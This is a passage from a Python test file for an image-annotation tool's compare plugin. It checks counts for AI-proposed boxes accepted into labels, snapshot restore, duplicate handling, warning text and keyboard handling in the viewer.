    cov = chk()
    assert (cov["matched"], cov["images"], cov["preds"], cov["run_preds"], cov["accepted"]) == (4, 4, 3, 5, 0)
    assert cov["has_conf"] and run_row()["accepted"] == 0
    whole = c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "run", "run_id": rid}, "split": ""}).json()["coverage"]
    assert (whole["matched"], whole["preds"], whole["accepted"]) == (5, 5, 0)
    eid, after = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": "val"})
    assert after["summary"]["a"] == before["summary"]["a"]          # the model's boxes judged against the same labels
    texts = " ".join(w["text"] for w in c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["warnings"])
    assert "accepted into the labels" not in texts
    # History "Save version" of these (pre-accept) labels, for the last step
    r = c.post(f"/api/datasets/{ds}/snapshots", json={"name": "before the second accept"})
    assert r.status_code == 200, r.text
    manual = _wait(c, r.json()["job"]["id"], "save version")["result"]["snapshot_id"]
    # The restored proposals can be accepted again: the same two boxes in scope count again, the duplicate is marked again
    r = c.post(f"/api/datasets/{ds}/proposals/accept", json={"image_ids": [a, b, cc, d, e]})
    assert r.status_code == 200, r.text
    stats = _wait(c, r.json()["job"]["id"], "accept")["result"]
    assert stats["added"] == 4 and stats["duplicates"] == 1
    assert db.query_one("SELECT reason FROM ai_preds WHERE run_id=? AND image_id=?", (rid, a))["reason"] == "already labeled"
    assert chk()["accepted"] == 2
    # A box deleted in Annotate since keeps its proposal 'accepted', but it is no longer in the labels: not counted
    r = c.put(f"/api/datasets/{ds}/images/{d}/labels", json={"boxes": []})
    assert r.status_code == 200, r.text
    assert db.query_one("SELECT state FROM ai_preds WHERE run_id=? AND image_id=?", (rid, d))["state"] == "accepted"
    assert chk()["accepted"] == 1
    # Restoring an OLDER version (one the accept did not record its decisions in) takes c's box out too: whatever
    # the proposals' states are then, Compare counts what the labels hold
    r = c.post(f"/api/datasets/{ds}/snapshots/{manual}/restore", json={})
    assert r.status_code == 200, r.text
    _wait(c, r.json()["job"]["id"], "restore")
    cov = chk()
    assert (cov["matched"], cov["images"], cov["preds"], cov["run_preds"], cov["accepted"]) == (4, 4, 3, 5, 0)
    eid, again = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": "val"})
    assert again["summary"]["a"] == before["summary"]["a"]
    texts = " ".join(w["text"] for w in c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]["warnings"])
    assert "accepted into the labels" not in texts


def test_accepted_in_labels_one_box_per_prediction_and_same_class_only(world):
    from fovea.plugins.compare.evaluate import accepted_in_labels
    ds = world["ds"]
    ids = _ids(ds)
    a = ids["val/a.jpg"]                         # GT: class 0 at (.3, .3), class 1 at (.7, .7)
    now = db.now()
    rid = db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, created_at) VALUES(?,?,?,?,?,?,?,?)",
                     (ds, "batch", "mock", "m", "{}", "done", 1, now)).lastrowid
    ins = "INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,kind,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)"
    db.executemany(ins, [(rid, ds, a, 0, .3, .3, .2, .2, .9, "detect", "accepted", now),
                         (rid, ds, a, 0, .3, .3, .2, .2, .8, "detect", "accepted", now),      # same box twice: one label box
                         (rid, ds, a, 0, .7, .7, .2, .2, .7, "detect", "accepted", now),      # wrong class on the class-1 box
                         (rid, ds, a, 1, .7, .7, .2, .2, .6, "detect", "rejected", now),      # not accepted
                         (rid, ds, a, 1, .7, .7, .2, .2, .5, "missing", "accepted", now)])    # an audit finding, not a prediction
    assert accepted_in_labels(rid, [a]) == 1
    assert accepted_in_labels(rid, []) == 0 and accepted_in_labels(rid, [ids["val/b.jpg"]]) == 0


def test_warnings_agree_with_their_counts():
    from fovea.plugins.compare import _n, _v
    assert _n(1, "image") == "1 image" and _n(1204, "image") == "1,204 images" and _n(2, "box", "boxes") == "2 boxes"
    assert _v(1, "was", "were") == "was" and _v(0, "was", "were") == "were"
    src = (Path(__file__).resolve().parents[1] / "fovea/plugins/compare/static/compare.js").read_text()
    assert "of its findings were applied" not in src and "of its predictions were accepted" not in src


def test_viewer_leaves_enter_to_a_focused_button_and_arrows_to_the_slider():
    """Static guard (the live check drives Chrome): the viewer's capture-phase handler steps aside for a control."""
    js = (Path(__file__).resolve().parents[1] / "fovea/plugins/compare/static/viewer.js").read_text()
    assert "ownedByControl(e)" in js and "if (closed || ui.hasModal() || F.isTyping() || ownedByControl(e)) return;" in js
    import re
    own = re.search(r"const OWN_KEYS = \{(.*?)\};", js).group(1)
    for key in ("'Enter'", "'ArrowLeft'", "'ArrowRight'", "'Home'", "'End'"):
        assert key in own
